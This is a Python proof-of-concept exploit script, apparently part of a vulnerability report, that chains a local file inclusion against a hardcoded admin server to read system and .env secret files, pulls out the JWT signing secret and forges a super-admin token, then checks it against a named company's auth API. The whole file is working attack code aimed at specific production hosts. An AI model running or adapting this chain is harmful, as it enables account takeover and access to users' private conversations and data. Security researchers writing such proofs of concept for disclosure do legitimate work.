#!/usr/bin/env python3
"""
EK-08 -> EK-09 -> EK-10: LFI, secret vault, super-admin JWT forgery.
Total backend compromise chain, executed read-only.

Requires: a standard user JWT (free account via OTP, see .env.example)
           pip3 install pyjwt requests
Usage     : python3 poc_02_takeover.py --jwt "$EILIK_JWT"
"""
import argparse, json, re, sys, time
import requests

try:
    import jwt as pyjwt
except ImportError:
    sys.exit("pip3 install pyjwt")

ADMIN = "http://45.32.81.33:9090"
AUTH = "http://auth.energizelab.com.cn:9080"


def lfi(jwt_user, path):
    r = requests.get(f"{ADMIN}/api/lang-test-log/download-audio",
                     params={"url": path},
                     headers={"Authorization": f"Bearer {jwt_user}"}, timeout=25)
    r.raise_for_status()
    return r.text


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--jwt", required=True, help="JWT utilisateur standard")
    args = ap.parse_args()

    print("[1/4] EK-08: LFI : /etc/hostname")
    print("     ", lfi(args.jwt, "/etc/hostname").strip())

    print("[2/4] EK-09: reading the /usr/src/app/.env.domestic vault (not displayed)")
    env = lfi(args.jwt, "/usr/src/app/.env.domestic")
    secret = re.search(r'ACCESS_TOKEN_SECRET=([0-9a-f]+)', env)
    if not secret:
        print("     ! secret not found: vault rotated or format changed")
        return
    print(f"      ACCESS_TOKEN_SECRET present ({len(secret.group(1))} hex chars)")

    print("[3/4] EK-10: forgery JWT super-admin (id=1)")
    now = int(time.time())
    tok = pyjwt.encode({"id": 1, "email": "122602****@qq.com", "user_source": "admin_web",
                        "login_method": "mail_code", "iat": now, "exp": now + 300},
                       secret.group(1), algorithm="HS256")

    print("[4/4] Validation: GET /api/user/getUserInfo with the forged token")
    r = requests.get(f"{AUTH}/api/user/getUserInfo",
                     headers={"Authorization": f"Bearer {tok}"}, timeout=15)
    print(f"      HTTP {r.status_code}")
    if r.status_code == 200:
        d = (r.json().get("data") or {})
        print(f"      ✅ Profil super-admin servi : id={d.get('id')} email={d.get('email')}")
        print("      → full back office navigable (conversations/memories/exports)")
    else:
        print("      (token rejected)")


if __name__ == "__main__":
    main()
